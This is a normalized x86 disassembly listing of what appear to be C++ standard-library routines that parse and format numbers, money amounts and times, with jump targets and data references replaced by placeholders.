cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov ecx ebx
call sub_1003f1eb
cmp al 0x30
jl r-xdata
test [ ebp - 0x6c ] 0x8
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x6c ] 0xffffffef
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_100020e2
mov bl 0x1
jmp r-xdata
push 0x0
push 0x30
push 0x1
mov ecx esi
call sub_100014aa
dec edi
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x80 ] edi
jge r-xdata
cmp [ ebp - 0x80 ] edi
jge r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
lea esi [ ebp - 0x44 ]
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
mov ecx ebx
call sub_1003f1eb
cmp al 0x39
jg r-xdata
test bl bl
je r-xdata
and [ ebp - 0x6c ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_100020e2
test [ ebp - 0x6c ] 0x10
je r-xdata
mov esi [ ebp - 0x7c ]
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jl r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
test edi edi
jbe r-xdata
cmp edi esi
je r-xdata
mov ecx ebx
call sub_1003f1eb
cmp al [ ebp - 0x6d ]
jne r-xdata
mov ecx ebx
call sub_1003f1eb
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0xa8 ] al
push [ ebp - 0xa8 ]
push 0x1
call sub_100014aa
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x7f
je r-xdata
mov ecx [ ebp - 0x94 ]
call sub_1003f06e
mov ecx [ ebp - 0x90 ]
lea eax [ ebp - 0x17c ]
push eax
call sub_1004317c
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xa
call sub_100021c3
push 0x0
push 0x1
lea ecx [ ebp - 0x17c ]
mov [ ebp - 0x4 ] 0x3
call sub_100020e2
mov [ ebp - 0x75 ] 0x1
jmp r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x39
jg r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_100020e2
jmp r-xdata
cmp [ esi ] 0x7f
je r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
jle r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100014aa
inc edi
mov ecx ebx
call sub_1003f06e
push [ ebp - 0x74 ]
push ebx
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
inc [ eax ]
jmp r-xdata
mov ecx esi
call sub_1003f1eb
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0xb0 ] al
push [ ebp - 0xb0 ]
push 0x1
call sub_100014aa
inc [ ebp - 0x80 ]
mov ecx esi
call sub_1003f06e
push [ ebp - 0x74 ]
push esi
call sub_1003f200
jmp r-xdata
dec edi
je r-xdata
mov [ ebp - 0x65 ] 0x1
inc edi
jmp r-xdata
pop ecx
pop ecx
test al al
je r-xdata
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x65 ] 0x1
mov esi eax
jmp r-xdata
sub_1004c8c5
push 0x120
mov eax sub_1004f7d9
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x78 ] edi
xor esi esi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] esi
mov ecx edi
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1004beea
pop ecx
lea ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x84 ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1004bf87
pop ecx
lea ecx [ ebp - 0x84 ]
jmp r-xdata
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x38 ]
cmp eax [ ebp - 0x68 ]
ja r-xdata
neg eax
mov [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_10007dbd
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10043163
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cmp eax esi
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x68 ]
sub ecx eax
push 0x30
inc ecx
push ecx
push esi
lea ecx [ ebp + 0x24 ]
call sub_10005cf6
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x48 ]
call sub_100082a7
cmp [ ebp + 0x20 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc4 ]
push eax
mov ecx ebx
call sub_10043240
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc4 ]
push eax
mov ecx ebx
call sub_1004317c
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x69 ] 0x0
xor ecx ecx
lea eax [ ebp - 0xc4 ]
push eax
mov ecx ebx
call sub_1003f21b
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_100021c3
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x7
call sub_100020e2
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x48 ]
call sub_100021c3
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
call sub_100020e2
lea ecx [ ebp - 0x64 ]
call sub_100082a7
mov eax [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
mov [ ebp - 0x70 ] al
jae r-xdata
inc esi
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x38 ]
sub esi [ ebp - 0x68 ]
lea edi [ ebp - 0x28 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov [ ebp - 0x69 ] 0x1
add esi [ ebp - 0x50 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov edi [ ebp - 0x78 ]
xor esi esi
test al al
jle r-xdata
movsx eax [ ebp + ecx - 0x70 ]
sub eax 0x20
je r-xdata
mov eax [ edi + 0x18 ]
test eax eax
jle r-xdata
add esi [ ebp - 0x34 ]
jmp r-xdata
sub eax 0x4b
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor esi esi
cmp eax esi
jbe r-xdata
mov eax [ ebp - 0x68 ]
cmp [ ebp + 0x38 ] eax
ja r-xdata
dec eax
dec eax
je r-xdata
push [ ebp - 0x70 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_10005cf6
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
and [ ebp - 0x74 ] 0x0
cmp edi 0x100
jne r-xdata
sub eax esi
mov esi eax
jmp r-xdata
xor eax eax
sub eax [ ebp + 0x38 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
mov al [ edi ]
cmp al 0x7f
je r-xdata
mov edi eax
jmp r-xdata
push 0x1
push [ ebp + 0x1c ]
lea eax [ ebp - 0xa8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004b39e
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x90 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004b39e
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x69 ] 0x0
jne r-xdata
mov edi [ edi + 0x10 ]
and edi 0x1c0
cmp edi 0x40
je r-xdata
xor edx edx
cmp edx [ ebp - 0x68 ]
sbb edx edx
neg edx
add edx [ ebp + 0x38 ]
add edx eax
add esi edx
jmp r-xdata
inc [ ebp - 0x74 ]
cmp [ ebp - 0x74 ] 0x4
jb r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004b39e
add esp 0x14
xor esi esi
lea eax [ ebp - 0x114 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10008213
push [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xa0 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x74 ]
movsx eax [ ebp + eax - 0x70 ]
sub eax 0x20
je r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004b362
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x78 ]
and [ eax + 0x18 ] 0x0
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x7c ]
call sub_1004b39e
add esp 0x14
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_100020e2
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_100020e2
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_100020e2
push esi
push edi
lea ecx [ ebp + 0x24 ]
call sub_100020e2
mov eax [ ebp - 0x7c ]
call sub_1002b392
retn 0x38
push edi
lea eax [ ebp - 0x98 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10008213
mov ecx eax
call sub_10042d0f
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004b362
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10008213
push 0x1
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf4 ]
jmp r-xdata
mov eax [ ebp - 0x68 ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x38 ] eax
ja r-xdata
lea eax [ ebp - 0xfc ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10008213
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xd4 ]
cmp edi 0x100
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x10c ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10008213
mov ecx [ ebp + 0x38 ]
sub ecx [ ebp - 0x68 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x11c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004b362
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add esp 0x18
mov ecx ebx
call [ eax + 0x4 ]
mov [ ebp - 0x8c ] al
push [ ebp - 0x8c ]
lea ecx [ ebp + 0xc ]
call sub_1003f048
push [ ebp - 0x68 ]
lea eax [ ebp - 0x12c ]
push eax
lea eax [ ebp - 0x104 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10008282
mov ecx eax
call sub_1004b552
push [ ebp - 0x68 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xe4 ]
jmp r-xdata
push 0x30
lea ecx [ ebp + 0xc ]
call sub_1003f048
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
mov [ ebp - 0x80 ] al
push [ ebp - 0x80 ]
lea ecx [ ebp + 0xc ]
call sub_1003f048
mov eax [ ebp - 0x68 ]
sub eax [ ebp + 0x38 ]
push eax
push 0x30
push [ ebp + 0x10 ]
lea eax [ ebp - 0xdc ]
push [ ebp + 0xc ]
push eax
call sub_1004b39e
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
add esp 0x14
lea eax [ ebp - 0xec ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10008213
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xcc ]
jmp r-xdata
sub_1004cdf8
push 0x10
mov eax sub_1004f801
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10007876
mov ecx [ eax ]
lea edi [ esi + 0x14 ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_100453cd
push edi
push ebx
push eax
call sub_10006c37
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1004540c
push edi
push ebx
push eax
call sub_10006c37
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1004de44
mov [ esi + 0x10 ] eax
call sub_1002b37e
retn 0x4
sub_1004ce7b
push 0x4c
mov eax sub_1004f82c
call sub_1002b30f
mov eax [ ebp + 0x20 ]
mov edx [ ebp + 0x28 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x58 ] edx
call sub_1004c0c1
lea eax [ ebp + 0x14 ]
xor edi edi
push eax
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
call sub_1003f0b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] edi
jne r-xdata
or [ esi ] 0x1
lea ecx [ ebp - 0x48 ]
call sub_100082a7
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006c60
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x30
jl r-xdata
or [ esi ] 0x2
jmp r-xdata
xor edi edi
push 0x2d
inc edi
push edi
lea ecx [ ebp - 0x48 ]
call sub_100014aa
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x39
jle r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_100020e2
mov eax ebx
call sub_1002b392
retn 0x24
cmp edi [ ebp - 0x18 ]
jb r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov al [ eax ]
mov [ ebp - 0x54 ] al
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x48 ]
push 0x1
call sub_100014aa
inc edi
cmp [ ebp - 0x30 ] 0x10
mov edi [ ebp - 0x44 ]
jae r-xdata
and [ ebp - 0x4c ] 0x0
lea eax [ ebp - 0x4c ]
push eax
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push edi
call sub_10022dec
add esp 0x10
cmp [ ebp - 0x50 ] edi
je r-xdata
lea edi [ ebp - 0x44 ]
or [ esi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
mov eax [ ebp - 0x58 ]
fstp [ eax ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
sub_1004cf9d
push 0x20
mov eax sub_1004f859
call sub_1002b30f
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1004c0c1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100021c3
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_100020e2
mov eax edi
call sub_1002b392
retn 0x24
sub_1004d01c
push 0x54
mov eax sub_1004f886
call sub_1002b30f
fldz
mov [ ebp - 0x60 ] ecx
fcomp [ ebp + 0x20 ]
mov [ ebp - 0x5c ] 0x0
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp + 0x20 ]
and [ ebp - 0x58 ] 0x0
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jpe r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x5c ] 0x1
fchs
fstp [ ebp + 0x20 ]
lea ecx [ ebp - 0x54 ]
fstp st0
call sub_100082a7
fld [ ebp + 0x20 ]
and [ ebp - 0x4 ] 0x0
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
call sub_10027b13
mov edi eax
add esp 0x14
xor esi esi
test edi edi
jle r-xdata
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_100014aa
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x58 ] esp
push eax
call sub_10002255
push [ ebp - 0x5c ]
mov ecx [ ebp - 0x60 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004c8c5
push 0x0
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_100020e2
mov eax [ ebp + 0x8 ]
call sub_1002b392
retn 0x20
movzx eax [ ebp + esi - 0x38 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_100014aa
inc esi
cmp esi edi
jl r-xdata
fld [ ebp + 0x20 ]
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fstp [ ebp + 0x20 ]
fld [ ebp + 0x20 ]
fcomp st1
fnstsw ax
test ah 0x1
je r-xdata
sub_1004d11c
push 0x28
mov eax sub_1004f8b3
call sub_1002b30f
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x18 ] 0x10
mov edi ecx
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax ]
xor esi esi
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
inc eax
cmp [ eax ] 0x2d
mov [ ebp - 0x30 ] 0x0
jne r-xdata
cmp cl 0x30
jge r-xdata
cmp cl 0x39
jg r-xdata
push esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000dd07
and [ ebp - 0x4 ] 0x0
test esi esi
jne r-xdata
inc esi
mov cl [ esi + eax ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x34 ] esp
push eax
call sub_10002255
push [ ebp - 0x30 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004c8c5
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp + 0x8 ]
call sub_1002b392
retn 0x1c
push 0x30
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100014aa
sub_1004d1bf
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1004cdf8
mov eax esi
call sub_1002b37e
retn 0x8
sub_1004d1f2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
mov eax [ ecx ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x18 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x20
sub_1004d233
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1004d21b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1004d254
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push ebx
mov ecx esi
mov [ ebp - 0x34 ] eax
lea edi [ ebp - 0x24 ]
call sub_1003f0b8
test al al
jne r-xdata
push ebx
push esi
mov [ ebp - 0x25 ] 0x0
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_1003f1eb
mov ecx esi
cmp al 0x2b
jne r-xdata
push ebx
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jne r-xdata
call sub_1003f1eb
cmp al 0x2d
jne r-xdata
mov [ ebp - 0x24 ] al
jmp r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jl r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1003f06e
push ebx
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x24 ] al
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_1003f06e
mov ecx esi
call sub_1003f1eb
cmp al 0x39
jg r-xdata
and [ ebp - 0x30 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
push 0xa
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov [ edi ] 0x0
call sub_100229f4
and [ ebp - 0x2c ] 0x0
add esp 0x10
push ebx
mov ecx esi
mov edi eax
call sub_1003f0b8
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov ecx esi
call sub_1003f1eb
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x38 ] eax
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1003f06e
inc edi
or [ ebp - 0x2c ] 0x2
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov eax [ ebp - 0x34 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
sub_1004d39f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x24 ]
lea eax [ edi + 0x8 ]
push eax
push 0x17
xor ebx ebx
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
mov [ ebp - 0x4 ] ecx
call sub_1004d254
mov esi [ ebp + 0x20 ]
add esp 0x18
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
lea ecx [ ebp + 0xc ]
call sub_1003f06e
lea eax [ edi + 0x4 ]
push eax
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1004d254
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f06e
push edi
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1004d254
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_1004d45d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov [ ebp - 0x8 ] edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
mov ebx [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10048504
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f06e
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f06e
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
